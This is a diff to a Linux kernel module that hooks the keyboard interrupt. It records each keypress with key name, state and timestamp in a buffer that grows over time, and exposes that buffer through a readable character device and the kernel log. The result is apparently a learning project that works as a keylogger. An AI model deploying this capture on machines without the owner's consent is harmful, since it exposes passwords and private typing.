@@ -8,14 +8,64 @@ int register_device(void);
 void unregister_device(void);
 int __init m_init(void);
 void __exit m_exit(void);
+void add_entry(int scancode, int release, struct rtc_time *time);
+char *strdup(char const *str);
+char *strjoin_nl(char const *str1, char const *str2);
+char *clean_join(char *str1, char *str2);
 
-static const char buffer[] = "I'm a dinosaur";
-int buffer_size = sizeof(buffer);
+char *character_device_file;
+int cd_file_size = 0;
 
 static struct file_operations fops = {
 	.owner = THIS_MODULE,
 	.read = device_read,
 };
+
+char *strdup(char const *str) {
+	int len = strlen(str);
+	char *result = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
+	if (!result)
+		return NULL;
+	for (int i = 0; i < len; i++) {
+		result[i] = str[i];
+	}
+	result[len] = '\0';
+	return result;
+}
+
+char *strjoin_nl(char const *str1, char const *str2) {
+	size_t	len_str1 = strlen(str1);
+	size_t	len_str2 = strlen(str2);
+
+	char *result = kmalloc((len_str1 + len_str2 + 2) * sizeof(char), GFP_KERNEL);
+	if (!result)
+		return (NULL);
+
+	for (int i = 0; i < len_str1; i++) {
+		result[i] = str1[i];
+	}
+	for (int i = 0; i < len_str2; i++) {
+		result[i + len_str1] = str2[i];
+	}
+
+	result[len_str1 + len_str2] = '\n';
+	result[len_str1 + len_str2 + 1] = '\0';
+	return (result);
+}
+
+ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offset) {
+	LOG("reading device");
+
+	if (*offset >= cd_file_size)
+		return 0;
+	if (*offset + len > cd_file_size)
+		len = cd_file_size - *offset;
+	if (copy_to_user(u_buffer, character_device_file + *offset, len) != 0)
+		return -EFAULT;
+
+	*offset += len;
+	return len;
+}
 
 struct miscdevice misc;
 int register_device(void) {
@@ -36,18 +86,21 @@ void unregister_device(void) {
 	misc_deregister(&misc);
 }
 
-ssize_t device_read(struct file *filep, char *user_buffer, size_t len, loff_t *offset) {
-	LOG("reading device");
+void add_entry(int scancode, int release, struct rtc_time *time) {
+	char entry[42];
+	int len = scnprintf(entry, 42, "[%ptRt] %s (%d) %s", time, kbus[scancode], scancode, STATE(release));
 
-	if (*offset >= buffer_size)
-		return 0;
-	if (*offset + len > buffer_size)
-		len = buffer_size - *offset;
-	if (copy_to_user(user_buffer, buffer + *offset, len) != 0)
-		return -EFAULT;
+	if (len <= 0)
+		return ;
+	char *join = strjoin_nl(character_device_file, entry);
+	if (!join)
+		return ;
 
-	*offset += len;
-	return len;
+	kfree(character_device_file);
+	character_device_file = join;
+	cd_file_size += len + 1;
+
+	LOGF("character_device: %s", character_device_file);
 }
 
 static irqreturn_t irq_handler(int irq, void *dev_id) {
@@ -58,7 +111,7 @@ static irqreturn_t irq_handler(int irq, void *dev_id) {
 	struct rtc_time time = rtc_ktime_to_tm(ktime_get_real());
 	WINTER_TIME(time);
 
-	LOGF("[%ptRt] %s (%d) %s", &time, kbus[scancode], scancode, release ? "Released" : "Pressed");
+	add_entry(scancode, release, &time);
 	return IRQ_NONE;
 }
 
@@ -72,6 +125,11 @@ int __init m_init(void) {
 	err = request_irq(1, irq_handler, IRQF_SHARED, "dino_keyboard", (void *)irq_handler);
 	if (err) {
 		LOG("request_irq failed");
+		return err;
+	}
+	character_device_file = strdup("");
+	if (!character_device_file) {
+		LOG("buffer init failed");
 		return err;
 	}
 	return 0;
